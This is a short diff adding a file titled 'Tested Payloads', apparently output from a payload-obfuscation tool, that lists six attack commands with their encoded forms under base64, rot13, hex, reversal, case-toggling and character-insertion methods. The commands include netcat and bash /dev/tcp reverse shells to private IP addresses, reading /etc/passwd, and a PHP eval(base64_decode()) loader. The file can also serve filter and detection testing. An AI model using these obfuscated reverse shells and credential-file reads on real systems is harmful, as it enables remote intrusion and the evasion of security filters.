@@ -1,0 +1,34 @@
+Tested Payloads :-
+
+
+  Payload    : powershell -enc whoami
+  Method     : base64
+  Encoded    : cG93ZXJzaGVsbCAtZW5jIHdob2FtaQ==...
+
+
+  Payload    : cmd.exe /c whoami
+  Method     : rot13
+  Encoded    : pzq.rkr /p jubnzv...
+
+
+  Payload    : nc -e /bin/sh 192.168.1.1 4444
+  Method     : hex
+  Encoded    : \x6e\x63\x20\x2d\x65\x20\x2f\x62\x69\x6e\x2f\x73\x...
+
+
+  Payload    : bash -i >& /dev/tcp/10.0.0.1/4242
+  Method     : reverse
+  Encoded    : 2424/1.0.0.01/pct/ved/ &> i- hsab...
+
+
+  Payload    : eval(base64_decode(payload))
+  Method     : toggle
+  Encoded    : EvAl(bAsE64_DeCoDe(pAyLoAd))...	
+
+
+  Payload    : cat /etc/passwd
+  Method     : insert
+  Encoded    : cat% /e%tc/%pas%swd%...
+
+
+
